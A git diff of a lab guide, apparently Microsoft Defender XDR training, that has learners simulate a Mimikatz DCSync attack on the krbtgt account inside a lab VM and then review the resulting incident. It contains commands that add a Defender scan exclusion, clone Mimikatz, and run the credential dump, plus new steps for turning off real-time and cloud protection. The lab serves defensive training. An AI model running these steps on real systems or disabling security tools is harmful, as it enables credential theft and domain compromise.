@@ -22,7 +22,7 @@ In this lab, you will simulate a Lateral Movement attack using the Mimikatz tool
 
 1. On the Connect to Virtual Machine page, select RDP, Choose the option to **Download RDP File.**
 
-      ![VMrdp](./media/xdr28.png)
+      ![VMrdp](./media/xdr28upd.png)
 
       >**Note:** You might see the warning option while downloading the rdp file. please click on **keep.**
 
@@ -50,26 +50,30 @@ In this lab, you will simulate a Lateral Movement attack using the Mimikatz tool
 
 1. Open **PowerShell (Administrator)** from Windows search.
 
-      ![image](./media/attack2.png)
+      ![image](./media/attack1.png)
 
 1. Run the following command to create a folder named `Tools` and add it as an exclusion in Microsoft Defender so that files inside this folder are not scanned.
 
       ```shell
       New-Item -ItemType Directory -Force -Path "C:\Tools"
-      Add-MpPreference -ExclusionPath "C:\Tools
       ```
 
-      ![image](./media/attack1.png)
+      ```
+      Add-MpPreference -ExclusionPath "C:\Tools
+      ```
 
 1. Run the below command to download the Mimikatz tool in `C:\Tools` folder.
 
       ```
       cd C:\Tools
+      ```
+
+      ```
       git clone https://github.com/ParrotSec/mimikatz
       ```
     > **Note:** Mimikatz is an open-source tool primarily designed to extract authentication credentials from the memory of Windows operating systems
 
-      ![image](./media/attack1.png)
+      ![image](./media/attack13.png)
 
 1. Open **PowerShell (Admin)** and navigate to the below mentioned directory.
 
@@ -85,21 +89,29 @@ In this lab, you will simulate a Lateral Movement attack using the Mimikatz tool
      mimikatz.exe 
      ```
 
-      ![image](./media/attack1.png)
-
 1. Simulate a DC Sync attack and extract the credentials of the krbtgt account.
 
       ```shell
       lsadump::dcsync /domain:defenderxdr.internal /user:krbtgt
       ```
 
-      ![image](./media/attack1.png)
+      > **Note:** If you see an error message indicating that the command failed, it is due to antivirus,
 
-1. Once this command executes, Microsoft Defender’s attack disruption feature will log the user out of the Virtual Machine and prevent them from logging back in.
+      > 1. Navigate to Windows Security and click on **Virus & threat protection**.
+      ![image](./media/attack1n1.png)
+
+      > 2. Turn off **Real-time protection (1)** and **Cloud-delivered protection (2)**
+      ![image](./media/attack1n2.png)
+
+1. Once this command executes, Microsoft Defender’s attack disruption feature will log the user out of the Virtual Machine and prevent them from logging back in. It may take about 10-15 minutes to log out, please wait
 
 1. Now you can check your alerts in the Microsoft Defender portal, navigate to **Incidents & alerts** in the left-hand navigation pane.
 
       ![](./media/E1T3S3upd1.png)
+
+1. Navigate to **Incidents** and review the incident with the tag **Lateral Movement**.
+
+   ![](./media/E1T3S3upd2.png)
 
 1. Click **Alerts** to view the alerts queue.
 
